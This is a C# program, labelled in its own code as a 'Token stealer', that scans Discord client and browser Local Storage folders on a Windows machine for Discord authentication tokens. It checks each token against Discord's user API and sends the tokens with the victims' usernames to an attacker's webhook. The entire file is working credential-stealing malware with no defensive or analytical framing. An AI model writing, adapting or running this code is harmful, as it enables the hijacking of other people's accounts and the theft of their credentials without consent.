using CSharpDiscordWebhook.NET.Discord;
using System.Drawing;
using System.Text.RegularExpressions;
using Newtonsoft.Json.Linq;
using System.Net.Http.Headers;

string? pc_roaming = Environment.GetEnvironmentVariable("AppData");

string? pc_local = Environment.GetEnvironmentVariable("LOCALAPPDATA");

string[] crawl = new[]
{
            pc_roaming + "\\discord\\Local Storage\\leveldb",
            pc_roaming + "\\discordcanary\\Local Storage\\leveldb",
            pc_roaming + "\\Lightcord\\Local Storage\\leveldb",
            pc_roaming + "\\discordptb\\Local Storage\\leveldb",
            pc_roaming + "\\Opera Software\\Opera Stable\\Local Storage\\leveldb",
            pc_roaming + "\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb",
            pc_local + "\\Amigo\\User Data\\Local Storage\\leveldb",
            pc_local + "\\Torch\\User Data\\Local Storage\\leveldb",
            pc_local + "\\Kometa\\User Data\\Local Storage\\leveldb",
            pc_local + "\\Orbitum\\User Data\\Local Storage\\leveldb",
            pc_local + "\\CentBrowser\\User Data\\Local Storage\\leveldb",
            pc_local + "\\7Star\\7Star\\User Data\\Local Storage\\leveldb",
            pc_local + "\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb",
            pc_local + "\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb",
            pc_local + "\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb",
            pc_local + "\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb",
            pc_local + "\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb",
            pc_local + "\\Microsoft\\Edge\\User Data\\Defaul\\Local Storage\\leveldb",
            pc_local + "\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb",
            pc_local + "\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb",
            pc_local + "\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb",
            pc_local + "\\Iridium\\User Data\\Default\\Local Storage\\leveldb"
        };

DirectoryInfo[] Crawl = crawl.Select(x => new DirectoryInfo(x)).ToArray();

using HttpClient client = new();
DiscordMessage message = new()
{
    Username = "Token stealer"
};
DiscordWebhook webhook = new()
{
    Uri = new("[Insert Web hook here]")
};
List<string> tokens = new();
Scrape(ref tokens);
foreach (var token in tokens)
{
    JObject? data = await GetData(token);
    if (data is not null)
    {
        string username = data["username"].ToString();
        string descrim = data["discriminator"].ToString();
        if (!message.Embeds.Any(x => x.Title.Contains(username)))
            message.Embeds.Add(new()
            {
                Color = Color.Purple,
                Title = $"Found the token of User {username}#{descrim}",
                Description = token
            });

    }
}
await webhook.SendAsync(message);


void Scrape(ref List<string> tokens)
{
    foreach (var dir in Crawl)
    {
        if (!dir.Exists)
            continue;
        foreach (var file in dir.GetFiles())
        {
            if (file.Extension != ".log" && file.Extension != ".ldb")
                continue;
            if (!IsFileLocked(file))
                foreach (var line in File.ReadAllLines(file.FullName))
                {
                    string[] regexes = new[] { @"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", @"mfa\.[\w-]{84}" };
                    foreach (var regex in regexes)
                    {
                        var matches = Regex.Matches(line, regex);
                        if (matches.Count > 0)
                            for (int i = 0; i < matches.Count; i++)
                                tokens.Add(matches[i].Value);
                    }
                }
        }
    }
}

static bool IsFileLocked(FileInfo file)
{
    try
    {
        using FileStream stream = file.Open(FileMode.Open, FileAccess.Read, FileShare.None);
        stream.Close();
    }
    catch (IOException)
    {
        //the file is unavailable because it is:
        //still being written to
        //or being processed by another thread
        //or does not exist (has already been processed)
        return true;
    }

    //file is not locked
    return false;
}

async static Task<JObject?> GetData(string token)
{
    using HttpClient client = new();
    client.DefaultRequestHeaders.Add("Authorization", token);
    client.DefaultRequestHeaders.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36");
    client.DefaultRequestHeaders.Accept.Add(new MediaTypeWithQualityHeaderValue("application/json"));
    try
    {
        string data = await client.GetStringAsync("https://discord.com/api/v9/users/@me");
        return JObject.Parse(data);
    }
    catch
    {
        return null;
    }
}